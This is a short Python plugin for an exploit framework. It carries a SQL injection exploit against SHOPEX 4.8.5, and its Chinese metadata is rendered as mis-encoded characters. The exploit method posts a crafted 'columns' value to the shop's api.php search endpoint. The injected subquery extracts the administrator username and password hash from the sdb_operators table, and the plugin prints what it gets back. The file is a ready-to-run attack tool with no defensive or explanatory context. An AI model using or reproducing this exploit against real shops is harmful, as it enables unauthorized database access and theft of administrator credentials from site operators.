# -*- coding: utf-8-*-
class NSSPlugin:
    '''shopex_4.8.5_sqlInject'''
    infos = [
        ['���','SHOPEX 4.8.5 SQLע��Exploit'],
        ['����','nss'],
        ['����','2014/07/14'],
        ['��ַ','http://jadore.wang'],
        ]
    opts  = [
        ['RURL','localhost','Ŀ��URL'],
        ['RPATH','/shopex/','CMS·��'],
        ['RPORT','80','Ŀ��˿�'],
        ['PAYLOAD','false','����Ҫ�󹥻����']
        ]
    def exploit(self):
        if  RPORT == '443':
            url = "https://"+RURL+RPATH
        else:
            url = "http://"+RURL+":"+RPORT+RPATH
        url     = url+"api.php?act=search_dly_type&api_version=1.0"
        poc     = '1,2,(SELECT concat(username,0x7c,userpass) FROM sdb_operators limit 0,1) as name'
        value   = {"columns":poc}
        try:
            pp.prettyPrint("[+] Sending exp ..",YELLOW)
            res = exploitModule.urlPOST(url,value)
            ok = exploitModule.find(r'\w+[|]+\w+',res.read())[0]
            pp.prettyPrint("[*] Exploit Successful !",GREEN)
            pp.prettyPrint("[*] %s"%ok,GREEN)
        except Exception,e:
            pp.prettyPrint("[!] Exploit False ! CODE:%s"%e,RED)
